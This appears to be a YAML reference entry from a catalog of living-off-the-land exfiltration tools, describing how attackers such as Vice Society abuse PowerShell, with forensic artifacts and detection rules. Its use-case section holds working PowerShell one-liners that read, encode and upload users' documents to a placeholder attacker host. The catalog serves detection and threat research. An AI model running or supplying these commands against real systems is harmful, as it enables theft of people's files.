Name: PowerShell
Description: Native Windows command-line shell and scripting language, abused for
  fileless and stealthy exfiltration using built-in HTTP functions.
Category: native
Platform:
- Windows
Execution:
- cli
Capabilities:
- http-upload
- url-encoding
- base64-encoding
- fileless-exfiltration
- chunked-upload
- living-off-the-land
- script-obfuscation
- no-disk-artifacts
Forensics:
  FileNamePatterns:
    - powershell.exe
    - pwsh.exe
    - powershell_ise.exe
    - powershell.v2.exe
  LogFiles:
    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    - C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    - C:\Windows\System32\winevt\Logs/Microsoft-Windows-PowerShell%4Operational.evtx
    - /var/log/syslog  # (for Linux-based PowerShell Core)
  BinaryLocations:
  - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  CommandLineArgs:
  - Invoke-WebRequest
  - WebClient
  - UploadData
  - -Method
  - -Body
  - '[uri]::EscapeDataString'
  - '[Convert]::ToBase64String'
  - '[System.IO.File]::ReadAllBytes'
  NetworkArtifacts:
  - HTTP GET/POST requests to external servers
  - Suspicious Base64 strings in URLs
  - Frequent small GET requests in short intervals
  ConfigFiles: []
  ScheduledTask: []
  RegistryPersistence: []

ThreatActors:
- vice-society
- unc5527
UseCases:
- Title: Simple file download via GET
  Description: Download a file using PowerShell's Invoke-WebRequest.
  Command: Invoke-WebRequest -Uri "http://<ip>:8080/file.txt" -OutFile "$env:USERPROFILE\Downloads\file.txt"
- Title: Exfiltrate small text via URL-encoded GET
  Description: Read content from file, URL-encode it, and send via GET parameter.
  Command: '[uri]::EscapeDataString((Get-Content "$env:USERPROFILE\Documents\data.csv"
    | Out-String)); Invoke-WebRequest -Uri "http://<ip>:8080/exfil?data=$encoded"'
- Title: Base64 encode and send via GET
  Description: Base64-encode file content and exfiltrate using GET request.
  Command: '[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content
    "$env:USERPROFILE\Documents\data.csv" | Out-String))); Invoke-WebRequest -Uri
    "http://<ip>:8080/exfil?b64=$b64"'
- Title: Chunked GET exfiltration of large file
  Description: Split a Base64-encoded file into chunks and send them as individual
    GET requests.
  Command: foreach ($chunk in $chunks) { $encoded = [uri]::EscapeDataString($chunk);
    Invoke-WebRequest -Uri "http://<ip>:8080/exfil?chunk=$encoded&part=$i" }
- Title: POST body exfiltration of raw text
  Description: Send raw file content in POST body using Invoke-WebRequest.
  Command: Invoke-WebRequest -Uri "http://<ip>:8080/exfil" -Method POST -Body (Get-Content
    "$env:USERPROFILE\\Documents\\data.csv" -Raw)
- Title: POST file upload using byte array
  Description: Send file bytes using POST with application/octet-stream content type.
  Command: $bytes = [System.IO.File]::ReadAllBytes("$env:USERPROFILE\Documents\file.zip");
    (New-Object System.Net.WebClient).UploadData("http://<ip>:8080/exfil", $bytes)
- Title: Recursive document exfiltration with POST (Vice Society style)
  Description: Find files with specific extensions and send them to remote server
    using POST.
  Command: $files = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Include "*.docx","*.pdf"
    -Recurse; foreach ($f in $files) { $c = [System.IO.File]::ReadAllBytes($f.FullName);
    (New-Object System.Net.WebClient).UploadData("http://<ip>:8080/upload/$($f.Name)",
    "POST", $c) }
Detection:
  - Type: Suspicious PowerShell Flags
    Description: >
      Alert on use of flags such as `-EncodedCommand`, `-NoProfile`, `-WindowStyle Hidden`, or `-Command` with suspicious expressions (e.g., base64 payloads, curl usage).

  - Type: Data Staging and Exfil Scripts
    Description: >
      Monitor for scripts using commands like `Get-Content`, `Compress-Archive`, `ConvertTo-Base64`, or loops writing to external endpoints (HTTP, FTP, S3).

  - Type: Network Activity from PowerShell
    Description: >
      Detect PowerShell processes making outbound HTTP/HTTPS connections or DNS queries not typical of normal administrative behavior.

  - Type: Fileless Execution
    Description: >
      Detect PowerShell spawned from LOLBINs (e.g., `mshta.exe`, `wmic.exe`) or injected into other processes (e.g., via `reflective PE` loaders).

  - Type: Unusual Parent Process
    Description: >
      Flag PowerShell executions from non-standard parents like `Office`, `Outlook`, or `OneNote`, as these may be signs of initial access or staged exfiltration.
References:
- https://unit42.paloaltonetworks.com/vice-society-ransomware-powershell/
